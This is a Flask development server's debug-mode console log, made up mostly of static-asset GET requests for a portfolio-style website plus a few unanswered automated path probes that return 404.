 * Serving Flask app 'app' (lazy loading)
 * Environment: production
[31m   WARNING: This is a development server. Do not use it in a production deployment.[0m
[2m   Use a production WSGI server instead.[0m
 * Debug mode: on
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://172.17.0.2:5000/ (Press CTRL+C to quit)
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 271-129-312
223.237.233.161 - - [08/Nov/2021 03:38:40] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:40] "GET /css/bootstrap.min.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:40] "GET /css/isotope.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:40] "GET /js/fancybox/jquery.fancybox.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:40] "GET /css/animate.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:40] "GET /js/owl-carousel/owl.carousel.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:40] "GET /css/styles.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:40] "GET /font/css/font-awesome.min.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:41] "GET /js/modernizr-latest.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:42] "GET /js/jquery-1.8.2.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:42] "GET /js/bootstrap.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:42] "GET /js/jquery.isotope.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:42] "GET /js/jquery.nav.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:42] "GET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:43] "GET /js/jquery.fittext.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:43] "GET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:43] "GET /images/banner-bg.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:43] "GET /images/1.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:43] "GET /images/3.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:43] "GET /images/logo.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:43] "GET /images/5.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:44] "GET /images/2.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:44] "GET /js/waypoints.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:44] "GET /js/custom.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:44] "GET /images/banner-bg2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:44] "GET /js/owl-carousel/owl.carousel.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:44] "GET /images/banner-bg3.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:45] "GET /images/about-img.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:38:45] "GET /images/work/1.jpg HTTP/1.1" 200 -
193.118.53.202 - - [08/Nov/2021 03:41:56] "[33mGET /solr/ HTTP/1.1[0m" 404 -
223.237.233.161 - - [08/Nov/2021 03:43:58] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 03:43:58] "[36mGET /css/bootstrap.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:43:58] "[36mGET /css/isotope.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:43:59] "[36mGET /js/fancybox/jquery.fancybox.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:43:59] "[36mGET /css/animate.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:43:59] "[36mGET /js/owl-carousel/owl.carousel.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:43:59] "[36mGET /css/styles.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:43:59] "[36mGET /js/modernizr-latest.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:43:59] "[36mGET /font/css/font-awesome.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:43:59] "[36mGET /js/bootstrap.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:43:59] "[36mGET /js/jquery-1.8.2.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:43:59] "[36mGET /js/jquery.isotope.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:00] "[36mGET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:00] "[36mGET /js/jquery.nav.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:00] "[36mGET /js/jquery.fittext.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:00] "[36mGET /js/waypoints.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:00] "[36mGET /js/custom.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:00] "[36mGET /js/owl-carousel/owl.carousel.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:00] "[36mGET /images/logo.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:00] "[36mGET /images/banner-bg.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:00] "[36mGET /images/banner-bg2.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:00] "[36mGET /images/banner-bg3.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:00] "[36mGET /images/5.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:00] "[36mGET /images/3.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:01] "[36mGET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:01] "[36mGET /images/1.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:01] "[36mGET /images/2.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:01] "[36mGET /images/work/1.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:01] "[36mGET /images/about-img.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:01] "[36mGET /images/work/2.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:01] "[36mGET /images/work/3.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:01] "[36mGET /images/work/4.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:01] "[36mGET /images/work/5.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:02] "[36mGET /images/work/6.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:02] "[36mGET /images/work/7.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:02] "[36mGET /images/work/8.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 03:44:02] "[36mGET /images/links-arrow.png HTTP/1.1[0m" 304 -
192.241.200.198 - - [08/Nov/2021 03:54:41] "[33mGET /actuator/health HTTP/1.1[0m" 404 -
192.241.210.70 - - [08/Nov/2021 04:46:33] "[33mGET /hudson HTTP/1.1[0m" 404 -
223.237.233.161 - - [08/Nov/2021 05:03:17] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:17] "GET /css/bootstrap.min.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:17] "GET /css/isotope.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:17] "GET /js/fancybox/jquery.fancybox.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:17] "GET /css/animate.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:17] "GET /js/owl-carousel/owl.carousel.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:17] "GET /css/styles.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:18] "GET /font/css/font-awesome.min.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:18] "GET /js/modernizr-latest.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:18] "GET /js/jquery-1.8.2.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:18] "GET /js/bootstrap.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:18] "GET /js/jquery.isotope.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:18] "GET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:19] "GET /js/jquery.nav.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:19] "GET /js/jquery.fittext.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:19] "GET /js/waypoints.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:19] "GET /js/custom.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:19] "GET /images/logo.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:19] "GET /js/owl-carousel/owl.carousel.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:19] "GET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:19] "GET /images/1.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:20] "GET /images/5.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:20] "GET /images/2.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:20] "GET /images/3.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:20] "GET /images/banner-bg.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:20] "GET /images/banner-bg2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:20] "GET /images/banner-bg3.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:21] "GET /images/about-img.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:21] "GET /images/work/1.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:21] "GET /images/work/2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:22] "GET /images/work/3.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:23] "GET /images/work/4.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:23] "GET /images/work/5.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:24] "GET /images/work/6.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:24] "GET /images/work/7.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:25] "GET /images/work/8.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:26] "GET /images/links-arrow.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:56] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:56] "[36mGET /css/bootstrap.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:56] "[36mGET /css/isotope.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:56] "[36mGET /css/animate.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:56] "[36mGET /js/fancybox/jquery.fancybox.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:56] "[36mGET /js/owl-carousel/owl.carousel.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:57] "[36mGET /css/styles.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:57] "[36mGET /font/css/font-awesome.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:57] "[36mGET /js/modernizr-latest.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:57] "[36mGET /js/jquery-1.8.2.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:57] "[36mGET /js/bootstrap.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:57] "[36mGET /js/jquery.isotope.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:57] "[36mGET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:57] "[36mGET /js/jquery.nav.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:57] "[36mGET /js/jquery.fittext.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:58] "[36mGET /js/waypoints.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:58] "[36mGET /js/custom.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:58] "[36mGET /js/owl-carousel/owl.carousel.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:58] "[36mGET /images/logo.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:58] "GET /images/banner-bg.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:58] "[36mGET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:58] "[36mGET /images/5.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:58] "GET /images/banner-bg2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:58] "[36mGET /images/2.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:58] "GET /images/banner-bg3.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:59] "[36mGET /images/3.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:59] "[36mGET /images/1.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:03:59] "GET /images/about-img.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:59] "GET /images/work/1.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:03:59] "GET /images/work/2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:04:02] "GET /images/work/3.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:04:03] "GET /images/work/4.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:04:04] "GET /images/work/5.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:04:04] "GET /images/work/6.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:04:05] "GET /images/work/7.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:04:06] "GET /images/work/8.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:04:06] "GET /images/links-arrow.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:16] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:16] "GET /css/bootstrap.min.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:16] "GET /css/isotope.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:17] "GET /js/fancybox/jquery.fancybox.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:17] "GET /css/animate.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:17] "GET /js/owl-carousel/owl.carousel.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:17] "GET /css/styles.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:17] "GET /font/css/font-awesome.min.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:17] "GET /js/modernizr-latest.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:17] "GET /js/jquery-1.8.2.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:18] "GET /js/bootstrap.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:18] "GET /js/jquery.isotope.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:18] "GET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:18] "GET /js/jquery.nav.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:18] "GET /js/jquery.fittext.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:18] "GET /js/waypoints.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:19] "GET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:19] "GET /images/1.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:19] "GET /images/3.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:19] "GET /images/5.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:19] "GET /images/2.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:19] "GET /js/custom.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:19] "GET /js/owl-carousel/owl.carousel.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:19] "GET /images/logo.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:19] "GET /images/banner-bg.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:20] "GET /images/banner-bg2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:20] "GET /images/banner-bg3.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:20] "GET /images/about-img.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:20] "GET /images/work/1.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:20] "GET /images/work/2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:23] "GET /images/work/3.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:23] "GET /images/work/4.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:23] "GET /images/work/5.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:24] "GET /images/work/6.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:24] "GET /images/work/7.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:25] "GET /images/work/8.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:05:25] "GET /images/links-arrow.png HTTP/1.1" 200 -
167.71.23.72 - - [08/Nov/2021 05:05:31] "[33mGET /ab2g HTTP/1.1[0m" 404 -
167.71.23.72 - - [08/Nov/2021 05:05:31] "[33mGET /ab2h HTTP/1.1[0m" 404 -
223.237.233.161 - - [08/Nov/2021 05:08:26] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:08:26] "[36mGET /css/bootstrap.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:27] "[36mGET /js/fancybox/jquery.fancybox.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:27] "[36mGET /css/isotope.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:27] "[36mGET /css/animate.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:27] "[36mGET /js/owl-carousel/owl.carousel.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:27] "[36mGET /css/styles.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:27] "[36mGET /font/css/font-awesome.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:27] "[36mGET /js/modernizr-latest.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:27] "[36mGET /js/jquery-1.8.2.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:27] "[36mGET /js/jquery.isotope.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:27] "[36mGET /js/bootstrap.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:27] "[36mGET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:27] "[36mGET /js/jquery.nav.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:28] "[36mGET /js/waypoints.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:28] "[36mGET /js/jquery.fittext.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:28] "[36mGET /js/owl-carousel/owl.carousel.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:28] "[36mGET /js/custom.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:28] "[36mGET /images/logo.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:28] "[36mGET /images/banner-bg.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:28] "[36mGET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:28] "[36mGET /images/5.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:28] "[36mGET /images/2.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:28] "[36mGET /images/banner-bg2.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:29] "[36mGET /images/banner-bg3.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:29] "[36mGET /images/3.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:29] "[36mGET /images/1.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:29] "[36mGET /images/about-img.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:29] "[36mGET /images/work/1.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:29] "[36mGET /images/work/2.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:29] "[36mGET /images/work/3.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:29] "[36mGET /images/work/4.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:29] "[36mGET /images/work/5.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:29] "[36mGET /images/work/6.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:29] "[36mGET /images/work/7.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:29] "[36mGET /images/work/8.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:08:30] "[36mGET /images/links-arrow.png HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:52] "[36mGET /css/isotope.css HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:52] "[36mGET /js/fancybox/jquery.fancybox.css HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:52] "[36mGET /js/owl-carousel/owl.carousel.css HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:52] "[36mGET /css/bootstrap.min.css HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:52] "[36mGET /css/animate.css HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:53] "[36mGET /css/styles.css HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:54] "[36mGET /font/css/font-awesome.min.css HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:54] "[36mGET /js/modernizr-latest.js HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:54] "[36mGET /js/jquery-1.8.2.min.js HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:54] "[36mGET /js/bootstrap.min.js HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:54] "[36mGET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:54] "[36mGET /js/jquery.nav.js HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:54] "[36mGET /js/waypoints.js HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:54] "[36mGET /js/jquery.fittext.js HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:55] "[36mGET /js/jquery.isotope.min.js HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:55] "[36mGET /js/custom.js HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:55] "[36mGET /js/owl-carousel/owl.carousel.js HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:55] "[36mGET /images/links-arrow.png HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:09:56] "[36mGET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:10:02] "[36mGET /images/banner-bg.jpg HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:10:03] "[36mGET /images/1.png HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:10:03] "[36mGET /images/2.png HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:10:03] "[36mGET /images/banner-bg3.jpg HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:10:03] "[36mGET /images/banner-bg2.jpg HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:10:03] "[36mGET /images/3.png HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:10:03] "[36mGET /images/5.png HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:10:03] "[36mGET /images/logo.png HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:10:04] "[36mGET /images/about-img.jpg HTTP/1.1[0m" 304 -
223.237.225.171 - - [08/Nov/2021 05:10:05] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
162.142.125.44 - - [08/Nov/2021 05:10:27] "GET / HTTP/1.1" 200 -
162.142.125.44 - - [08/Nov/2021 05:10:27] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:10:33] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:10:33] "GET /css/bootstrap.min.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:10:33] "GET /css/isotope.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:10:34] "GET /js/fancybox/jquery.fancybox.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:10:34] "GET /css/animate.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:10:34] "GET /css/styles.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:10:34] "GET /js/owl-carousel/owl.carousel.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:10:34] "GET /font/css/font-awesome.min.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:10:34] "GET /js/modernizr-latest.js HTTP/1.1" 200 -
